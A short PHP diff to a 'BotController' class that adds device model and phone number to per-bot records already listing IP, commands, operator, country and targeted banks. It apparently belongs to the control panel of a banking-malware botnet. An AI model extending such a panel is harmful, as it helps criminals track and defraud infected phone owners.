@@ -147,6 +147,8 @@ class BotController extends Controller
                 'ip' => $row->ip,
                 'commands' => $row->commands,
                 'operator' => $row->operator,
+                'model' => $row->model,
+                'phone_number' => $row->phone_number,
                 'country' => $row->country,
                 'banks' => implode(':', $realBanks),
                 'icons' => $icons,
